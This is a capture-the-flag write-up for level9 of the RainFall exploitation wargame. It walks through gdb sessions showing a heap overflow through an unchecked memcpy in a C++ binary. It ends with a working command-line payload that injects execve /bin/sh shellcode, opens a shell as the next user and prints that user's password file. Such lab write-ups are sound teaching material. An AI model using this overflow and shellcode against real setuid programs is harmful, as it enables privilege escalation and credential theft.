We can see that this binary is cpp class
    (gdb) info functions
    0x080486f6  N::N(int)
    0x080486f6  N::N(int)
    0x0804870e  N::setAnnotation(char*)
    0x0804873a  N::operator+(N&)
    0x0804874e  N::operator-(N&)

If ac < 1 the main function will call _exit()
    0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
    0x08048602 <+14>:    jg     0x8048610 <main+28>
    0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
    0x0804860b <+23>:    call   0x80484f0 <_exit@plt>

There is a call to memcpy that is not protected against buffer overflow.
With ltrace we can find the buffer address
    $ ltrace ./level9 test
    memcpy(0x0804a00c, "test", 4) = 0x0804a00c

The program segfault at address 0x08048682 when we pass a string longer than 108.

We add a breakpoint there and run the program with a string to make it segfault
    (gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb

The program uses memcpy which we can use to do an overflow.
We put a breakpoint just after the memcpy and try to pass a string that will overflow the buffer

When placing a breakpoint after the call to annotation (and memcpy) we can see that eax will be overwritten if we pass a long string
	(gdb) b*0x0804867c
	(gdb) r $(ruby -e 'print "A" * 112')
	Starting program: /home/user/level9/level9 $(ruby -e 'print "A" * 112')
	Breakpoint 1, 0x0804867c in main ()
	
(gdb) x/x $eax
0x804a00c:      0x41414141
(gdb) ni
0x08048680 in main ()
(gdb) x/x $eax
0x804a078:      0x42424242

	Program received signal SIGSEGV, Segmentation fault.
	0x08048682 in main ()
		(gdb) i r
		eax            0x41414141       1094795585
		ecx            0x41414141       1094795585
		edx            0x804a07c        134520956
		ebx            0x804a078        134520952
		esp            0xbffff6a0       0xbffff6a0
		ebp            0xbffff6c8       0xbffff6c8
		esi            0x0      0
		edi            0x0      0
		eip            0x8048682        0x8048682 <main+142>

With gdb we can see that the program try to dereference eax and take the 4 bytes that comes after our 108 first bytes as the new address of eax
    (gdb) b*0x08048677
    Breakpoint 1 at 0x8048677
    Starting program: /home/user/level9/level9 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb

    Breakpoint 1, 0x08048677 in main ()
    (gdb) x/x $eax
    0x804a008:      0x08048848
    (gdb) ni
    0x0804867c in main ()
    (gdb) x/x $eax
    0x804a00c:      0x61616161
    (gdb) ni
    0x08048680 in main ()
    (gdb) x/x $eax
    0x804a078:      0x62626262
    (gdb) ni
    0x08048682 in main ()
    (gdb) x/x $eax
    0x62626262:     Cannot access memory at address 0x62626262

We can give a valid address after the 108bytes buffer to redirect the execution and call a shell code.
Our shellcode will be stored in the heap here : 0x804a00c

The edx will take the first 4 bytes at address 0x804a00c so we need to give an address here as well
that will point to our shellcode which will be 4 bytes after 0x804a00c
    (gdb) r $(ruby -e 'print "aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzzAABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ1122" + "\x0c\xa0\x04\x08"')
    Starting program: /home/user/level9/level9 $(ruby -e 'print "aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzzAABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ1122" + "\x0c\xa0\x04\x08"')

    Breakpoint 1, 0x08048677 in main ()
    (gdb) x/x $eax
    0x804a008:      0x08048848
    (gdb) ni
    0x0804867c in main ()
    (gdb) x/x $eax
    0x804a00c:      0x62626161
    (gdb) ni
    0x08048680 in main ()
    (gdb) x/x $eax
    0x804a078:      0x0804a00c
    (gdb) ni
    0x08048682 in main ()
    (gdb) x/x $eax
    0x804a00c:      0x62626161
    (gdb) ni
    0x08048684 in main ()
    (gdb) x/x $eax
    0x804a00c:      0x62626161
    (gdb) x/x $edx
    0x62626161:     Cannot access memory at address 0x62626161

level9@RainFall:~$ ./level9 $(ruby -e 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "a" * 59 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728